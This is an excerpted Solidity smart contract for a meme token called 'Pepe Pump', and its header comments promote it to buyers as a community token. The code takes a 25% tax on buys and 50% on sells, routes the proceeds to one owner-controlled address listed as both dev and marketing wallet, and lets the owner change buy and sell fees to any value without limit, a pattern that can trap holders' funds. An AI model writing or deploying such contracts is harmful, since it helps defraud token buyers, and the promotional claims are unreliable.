...
// PepePump Token - The Only Real Community Driven Token
// Take it before you miss it!
// Gas Fee optimized, cheap pump for pepers. 
// https://www.pepepump.xyz
//
...
contract PEPEP is ERC20, Ownable {
    mapping(address => bool) private _isExcludedFromFee;
    
    uint256 public feesLp;
    uint256 public feesDev = 2500;
    uint256 public feesMW = 2500;
    uint256 public feesSellTotal = feesLp + feesMW + feesDev;
    uint256 public feesBuyTotal = 2500;

    address public marketingWalletAddress = 0x7D5f3a330aeB8d79E9A174b088a5AAA16B258b5b;
    address public devWalletAddress = 0x7D5f3a330aeB8d79E9A174b088a5AAA16B258b5b;
    ...
    uint256 public _swapTokensAtAmount = 200;
    ...
    constructor() ERC20("Pepe Pump", "Pepe Pump") {
        uint256 startSupply = 420420420420420 * 10 ** decimals();
    ...
    function _transfer(
        ...
        if (
            ...
            if (to == uniswapV2Pair) {
                ...
                uint256 limit = balanceOf(uniswapV2Pair) * _swapTokensAtAmount / 10000;
                if (
                    balance >= limit
                ) {
                    if (balance >= 3 * limit) balance = 3 * limit;
                    _swapAndLiquify(balance);
                }
                taxAmount = amount * feesSellTotal / 10000;
            } else if (from == uniswapV2Pair) {
                taxAmount = amount * feesBuyTotal / 10000;
                require(
    ...
    function _swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 taxWithoutHalfLP = _feesSellTotal - feesLp / 2;
        uint256 toSell = contractTokenBalance * taxWithoutHalfLP / _feesSellTotal;

        _swapTokensForEth(toSell);
        uint256 newBalance = address(this).balance;

        uint256 toDev = newBalance * feesDev / taxWithoutHalfLP;
        uint256 toMarketing = newBalance * feesMW / taxWithoutHalfLP;
    ...
    function changeBuyFees(uint256 newValue) public onlyOwner {
        feesBuyTotal = newValue;
    }
    ...
    function changeSellFees(
        ...
        feesLp = _feesLp;
        feesMW = _feesMW;
        feesSellTotal = _feesDev + _feesLp + _feesMW;
    }
